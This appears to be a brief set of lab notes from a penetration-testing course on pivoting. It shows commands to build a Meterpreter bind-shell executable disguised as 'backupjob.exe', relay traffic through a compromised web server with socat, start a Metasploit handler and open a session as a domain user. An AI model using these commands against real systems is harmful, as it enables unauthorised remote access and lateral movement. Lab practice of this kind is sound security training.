![[Pasted image 20260518191511.png]]
#### Creating the Windows Payload

```shell
3kjS@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```
#### Starting Socat Bind Shell Listener

```shell
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
#### Configuring & Starting the Bind multi/handler

```shell
msf6 > use exploit/multi/handler
```
#### Establishing Meterpreter Session

```shell
meterpreter > getuid Server username: INLANEFREIGHT\victor
```